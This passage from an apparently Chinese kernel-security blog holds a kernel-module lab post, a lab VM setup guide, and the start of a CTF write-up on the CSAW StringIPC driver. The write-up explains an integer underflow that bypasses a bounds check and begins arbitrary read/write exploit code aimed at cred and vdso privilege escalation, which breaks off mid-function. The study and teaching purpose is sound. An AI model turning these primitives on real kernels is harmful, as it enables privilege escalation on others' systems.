&lt;48&gt; 3d 01 f0 ff ff 73 01 c3 48 8b 0d 23 37 0d 00 f7 d8 64 89 01 48</span><br><span class="line">[  139.812599] RSP: 002b:00007ffdee07d0f8 EFLAGS: 00000246 ORIG_RAX: 0000000000000139</span><br><span class="line">[  139.812600] RAX: ffffffffffffffda RBX: 000055e6a61767c0 RCX: 00007f0f9792173d</span><br><span class="line">[  139.812601] RDX: 0000000000000000 RSI: 000055e6a5c91358 RDI: 0000000000000003</span><br><span class="line">[  139.812602] RBP: 0000000000000000 R08: 0000000000000000 R09: 00007f0f979f8580</span><br><span class="line">[  139.812602] R10: 0000000000000003 R11: 0000000000000246 R12: 000055e6a5c91358</span><br><span class="line">[  139.812603] R13: 0000000000000000 R14: 000055e6a6176760 R15: 0000000000000000</span><br><span class="line">[  139.812604]  &lt;/TASK&gt;</span><br><span class="line">[  139.812605] Modules linked in: oops_mod(OE+) isofs xt_conntrack xt_MASQUERADE nf_conntrack_netlink nfnetlink xfrm_user xfrm_algo xt_addrtype iptable_filter iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 libcrc32c bpfilter br_netfilter bridge stp llc rfcomm aufs overlay bnep vsock_loopback vmw_vsock_virtio_transport_common vmw_vsock_vmci_transport vsock binfmt_misc nls_iso8859_1 intel_rapl_msr intel_rapl_common kvm_intel kvm crct10dif_pclmul ghash_clmulni_intel aesni_intel crypto_simd vmw_balloon cryptd btusb input_leds btrtl btbcm btintel bluetooth joydev serio_raw ecdh_generic ecc vmw_vmci mac_hid sch_fq_codel vmwgfx ttm drm_kms_helper cec rc_core fb_sys_fops syscopyarea sysfillrect sysimgblt msr parport_pc ppdev drm lp parport ip_tables x_tables autofs4 hid_generic crc32_pclmul usbhid ahci libahci psmouse hid e1000 mptspi pata_acpi mptscsih mptbase i2c_piix4 scsi_transport_spi</span><br><span class="line">[  139.812636] CR2: 0000000000000000</span><br><span class="line">[  139.812637] ---[ end trace 840a29bcd63bee0c ]---</span><br><span class="line">[  139.812638] RIP: 0010:my_oops_init+0x15/0x31 [oops_mod]</span><br><span class="line">[  139.812640] Code: Unable to access opcode bytes at RIP 0xffffffffc0b1bfeb.</span><br><span class="line">[  139.812641] RSP: 0018:ffffb1bb85c6bb98 EFLAGS: 00010246</span><br><span class="line">[  139.812642] RAX: 000000000000000b RBX: 0000000000000000 RCX: 0000000000000027</span><br><span class="line">[  139.812642] RDX: 0000000000000000 RSI: ffffb1bb85c6b9e0 RDI: ffff942775e60588</span><br><span class="line">[  139.812643] RBP: ffffb1bb85c6bb98 R08: ffff942775e60580 R09: 0000000000000001</span><br><span class="line">[  139.812644] R10: 0000000000000001 R11: 000000000000000f R12: ffffffffc0b1c000</span><br><span class="line">[  139.812644] R13: ffff942695cb5ac0 R14: ffffffffc0b1e000 R15: 0000000000000000</span><br><span class="line">[  139.812645] FS:  00007f0f977db740(0000) GS:ffff942775e40000(0000) knlGS:0000000000000000</span><br><span class="line">[  139.812646] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[  139.812647] CR2: ffffffffc0b1bfeb CR3: 00000001a9510003 CR4: 0000000000770ee0</span><br><span class="line">[  139.812664] PKRU: 55555554</span><br></pre></td></tr></table></figure>
<ul>
<li>不仅标识出了触发 kernel oops 的原因，还给出了触发的位置 <code>my_oops_init+0x15</code></li>
</ul>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板中准备 skeletons（具体来说就是 <code>linux/tools/labs/skels</code> 文件夹）</li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<p>下面的练习我就挑几个有意思的挂在博客上：</p>
<p>6.Module parameters：</p>
<ul>
<li>编译并复制关联的模块</li>
<li>并加载内核模块以查看 printk 消息</li>
<li>然后从内核中卸载模块</li>
</ul>
<p>在正常情况下载入模块，是如下的结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_modules/<span class="number">6</span>-cmd-mod<span class="meta"># insmod cmd_mod.ko                </span></span><br><span class="line">cmd_mod: loading out-of-tree <span class="keyword">module</span> taints kernel.                              </span><br><span class="line">Early bird gets the worm  </span><br></pre></td></tr></table></figure>
<ul>
<li>我们的目标就是把输出的 <code>Early bird gets the worm</code> 改为 <code>Early bird gets tired</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Command-line args module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *str = <span class="string">&quot;the worm&quot;</span>;</span><br><span class="line"></span><br><span class="line">module_param(str, charp, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(str, <span class="string">&quot;A simple string&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">cmd_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;Early bird gets %s\n&quot;</span>, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">cmd_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;Exit, stage left\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(cmd_init);</span><br><span class="line">module_exit(cmd_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>module_param</code> 表示向当前模块传入参数</li>
<li>通过如下命令就可以指定参数：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_modules/<span class="number">6</span>-cmd-mod<span class="meta"># insmod cmd_mod.ko str=tired</span></span><br><span class="line">Early bird gets tired   </span><br></pre></td></tr></table></figure>
<p>7.Proc info：</p>
<ul>
<li>添加代码以显示当前进程的进程ID和可执行文件名称</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> add missing headers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;List current processes&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Kernel Hacker&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_proc_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> * <span class="title">pos</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> print current process pid and its name */</span></span><br><span class="line">	p = current;</span><br><span class="line">	pr_info(<span class="string">&quot;current pid: %d\n&quot;</span>,p-&gt;pid);</span><br><span class="line">	pr_info(<span class="string">&quot;current name: %s\n&quot;</span>,p-&gt;comm);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> print the pid and name of all processes */</span></span><br><span class="line">	list_for_each(pos, &amp;p-&gt;tasks)</span><br><span class="line">	&#123;</span><br><span class="line">		p = list_entry(pos, struct task_struct, tasks);</span><br><span class="line">		pr_info(<span class="string">&quot;current pid: %d\n&quot;</span>,p-&gt;pid);</span><br><span class="line">		pr_info(<span class="string">&quot;current name: %s\n&quot;</span>,p-&gt;comm);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_proc_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> print current process pid and name */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	p = current;</span><br><span class="line">	pr_info(<span class="string">&quot;current pid: %d\n&quot;</span>,p-&gt;pid);</span><br><span class="line">	pr_info(<span class="string">&quot;current name: %s\n&quot;</span>,p-&gt;comm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_proc_init);</span><br><span class="line">module_exit(my_proc_exit);</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/10/Linux-Lab0-Preparation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/10/Linux-Lab0-Preparation/" class="post-title-link" itemprop="url">Linux-Lab0-Preparation</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-10 00:04:58 / Modified: 00:07:40" itemprop="dateCreated datePublished" datetime="2022-10-10T00:04:58+08:00">2022-10-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Experimental preparation</strong></p>
<p>在 Github 上下载对应的实验文件：<a target="_blank" rel="noopener" href="https://github.com/linux-kernel-labs/linux">linux-kernel-labs/linux: Linux kernel source tree (github.com)</a> </p>
<p>在 <code>tools/labs</code> 目录中输入命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=kernel_modules make skels</span><br></pre></td></tr></table></figure>
<p>然后在 <code>skels/kernel_modules</code> 目录中就会有实验文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ ls skels/kernel_modules/</span><br><span class="line">1-2-test-mod  4-multi-mod  6-cmd-mod    8-kdb</span><br><span class="line">3-error-mod   5-oops-mod   7-list-proc  9-dyndbg</span><br></pre></td></tr></table></figure>
<p><strong>Booting the virtual machine</strong></p>
<p>虚拟机基础结构摘要：</p>
<ul>
<li><code>~/src/linux</code>：Linux 内核源代码，编译模块需要</li>
<li><code>~/src/linux/tools/labs/qemu</code>：用于生成和运行 QEMU VM 的脚本和辅助文件</li>
</ul>
<p>为了启动虚拟机，我们需要在 <code>~/src/linux/tools/labs</code> 目录中使用 <code>make boot</code> 命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ make boot </span><br><span class="line">make -C /home/yhellow/linux</span><br><span class="line">make[1]: 进入目录“/home/yhellow/linux”</span><br><span class="line">  SYSTBL  arch/x86/include/generated/asm/syscalls_32.h</span><br><span class="line">  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_32.h</span><br><span class="line">  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_64.h</span><br><span class="line">  SYSHDR  arch/x86/include/generated/uapi/asm/unistd_x32.h</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>在默认情况下，您不会收到提示或任何图形界面，但您可以使用 minicom 或屏幕连接到虚拟机公开的控制台：</p>
<ul>
<li>在 <code>~/src/linux/tools/labs</code> 目录中使用 <code>minicom -D serial.pts</code>：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ minicom -D serial.pts</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Welcome to minicom <span class="number">2.7</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">OPTIONS: I18n </span><br><span class="line">Compiled on Dec <span class="number">23</span> <span class="number">2019</span>, <span class="number">02</span>:<span class="number">06</span>:<span class="number">26.</span></span><br><span class="line">Port serial.pts, <span class="number">19</span>:<span class="number">21</span>:<span class="number">44</span></span><br><span class="line"></span><br><span class="line">Press CTRL-A Z <span class="keyword">for</span> help on special keys</span><br></pre></td></tr></table></figure>
<ul>
<li>要访问虚拟机，请在登录提示符下输入用户名 root，无需输入密码</li>
<li>虚拟机将使用 root 帐户的权限启动</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Poky (Yocto Project Reference Distro) <span class="number">2.3</span> qemux86 /dev/hvc0</span><br><span class="line"></span><br><span class="line">qemux86 login: root                                                 </span><br><span class="line">root@qemux86:~<span class="meta"># whoami                                                          </span></span><br><span class="line">root                                                                            </span><br><span class="line">root@qemux86:~# </span><br></pre></td></tr></table></figure>
<p><strong>Adding and using a virtual disk</strong></p>
<p>在目录中，您有一个新的虚拟机磁盘，位于文件 <code>~/src/linux/tools/labs/mydisk.img</code>，我们要将磁盘添加到虚拟机中，并在虚拟机中使用它</p>
<ul>
<li>如果没有 <code>mydisk.img</code> 文件，则在如下网站中下载：<a target="_blank" rel="noopener" href="http://elf.cs.pub.ro/so2/res/laboratoare/mydisk.img">mydisk.img</a></li>
</ul>
<p>修改 <code>~/src/linux/tools/labs/qemu/Makefile</code>，在对应位置添加如下代码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-drive file=$(YOCTO_IMAGE),if=virtio,format=raw \</span><br><span class="line">-drive file=disk1.img,if=virtio,format=raw \</span><br><span class="line">-drive file=disk2.img,if=virtio,format=raw \</span><br><span class="line">-drive file=mydisk.img,if=virtio,format=raw \ # new</span><br></pre></td></tr></table></figure>
<p>启动虚拟机，创建目录并尝试挂载新磁盘</p>
<ul>
<li>已经向 qemu 添加了两个磁盘（<code>disk1.img</code> 和 <code>disk2.img</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~# /dev/vd                                                         </span><br><span class="line">vda  vdb  vdc  vdd </span><br></pre></td></tr></table></figure>
<ul>
<li>vda 是根分区，vdb 是 <code>disk1.img</code>，vdc 是 <code>disk2.img</code>，vdd 是 <code>mydisk.img</code></li>
<li>无需在 <code>/dev</code> 中手动创建新磁盘的条目，因为虚拟机使用 devtmpfs（在 Linux 内核启动早期建立一个初步的 <code>/dev</code>，令一般启动程序不用等待 udev）</li>
<li>使用 <code>mount</code> 命令进行挂载：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test</span><br><span class="line">mount /dev/vdd /test</span><br></pre></td></tr></table></figure>
<ul>
<li>结果挂载失败了（<code>/test</code> 中并没有出现 <code>mydisk.img</code> 中的文件），我们无法挂载虚拟磁盘的原因是，我们在内核中没有支持格式化的文件系统</li>
<li>您需要识别 mydisk.img 的文件系统，并编译对该文件系统的内核支持</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  labs git:(master) ✗ file mydisk.img </span><br><span class="line">mydisk.img: BTRFS Filesystem sectorsize 4096, nodesize 4096, leafsize 4096, UUID=df3c665a-363d-46f8-aef0-f9959bad6832, 32768/104857600 bytes used, 1 devices</span><br></pre></td></tr></table></figure>
<ul>
<li>您需要在内核中启用 btrfs 支持并重新编译内核映像（退出前记得 save）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">----------------------------------------</span><br><span class="line">File systems -&gt; Btrfs filesystem support</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># mount /dev/vdd /test                                            </span></span><br><span class="line">BTRFS: device fsid df3c665a<span class="number">-363</span>d<span class="number">-46f</span>8-aef0-f9959bad6832 devid <span class="number">1</span> transid <span class="number">9</span> /dev/)</span><br><span class="line"><span class="function">BTRFS <span class="title">info</span> <span class="params">(device vdd)</span>: disk space caching is enabled                          </span></span><br><span class="line"><span class="function">root@qemux86:~<span class="meta"># ls /test                                                        </span></span></span><br><span class="line"><span class="function">README                                                                          </span></span><br><span class="line"><span class="function">root@qemux86:~<span class="meta"># cat /test/README                                                </span></span></span><br><span class="line"><span class="function">Congratulations, you were able to follow instructions!  </span></span><br></pre></td></tr></table></figure>
<p><strong>GDB spelunking</strong></p>
<p>使用 gdb 显示创建内核线程 kernel_thread 的函数的源代码</p>
<ul>
<li>使用 gdb 查找内存中  jiffies 变量的地址及其内容</li>
<li>该变量保存自系统启动以来的计时周期数</li>
</ul>
<p>要跟踪 jiffies 变量的值，请在 gdb 中使用动态分析，方法是：</p>
<ul>
<li>先启动虚拟机</li>
<li>然后运行 <code>make gdb</code> 命令</li>
</ul>
<p>PS：由于我这里的环境有点问题，所以我使用了 <code>gdb vmlinux</code> 外加 <code>target remote :1234</code> 的形式来进行调试（也可以参考一下）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx &amp; jiffies</span><br><span class="line"><span class="number">0xc194b500</span> &lt;jiffies_64&gt;:	<span class="number">0x00000000ffff96c2</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/08/cred%20attack+vdso%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/08/cred%20attack+vdso%20attack/" class="post-title-link" itemprop="url">cred attack+vdso attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-08 22:25:14 / Modified: 22:29:32" itemprop="dateCreated datePublished" datetime="2022-10-08T22:25:14+08:00">2022-10-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>StringIPC 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 </span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap（这是我自己加的，原题没有）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">/bin/mount -a</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t tmpfs -o size=64k,mode=0755 tmpfs /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">sysctl -w kernel.hotplug=/sbin/mdev</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">insmod StringIPC.ko # 驱动模块</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">echo &quot;man, you got me&quot; &gt; flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">chmod 766 /dev/csaw</span><br><span class="line">nohup /sudo_timer &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>和 <code>qwb2018-solid_core</code> 的漏洞点一样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf_size = channel-&gt;buf_size;</span><br><span class="line">ch1 = buf_size + id;</span><br><span class="line">ch2 = buf_size - id;</span><br><span class="line"><span class="keyword">if</span> ( !key_s )</span><br><span class="line">    ch1 = ch2;</span><br><span class="line">data = (<span class="keyword">char</span> *)krealloc(channel-&gt;data, ch1 + <span class="number">1</span>, <span class="number">0x24000C0</span>LL);</span><br></pre></td></tr></table></figure>
<ul>
<li>CSAW_SHRINK_CHANNEL 会导致 <code>ch2</code> 负数溢出为“-1”</li>
<li><code>krealloc(channel-&gt;data, 0, 0x24000C0LL)</code> 返回“0”，使后面的 <code>channel-&gt;data = 0</code>，而 <code>channel-&gt;buf_size</code> 非常大  </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel-&gt;data = data;</span><br><span class="line">channel-&gt;buf_size = ch1;</span><br></pre></td></tr></table></figure>
<ul>
<li>进而绕过后面的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( channel_from.size + index_write &gt; channel_write-&gt;buf_size )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 <code>qwb2018-solid_core</code> 中，作者禁用了 “cred attack” 和 “vdso attack” 这两种方法，这里就来试一试</p>
<p>首先 WAA，RAA 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = 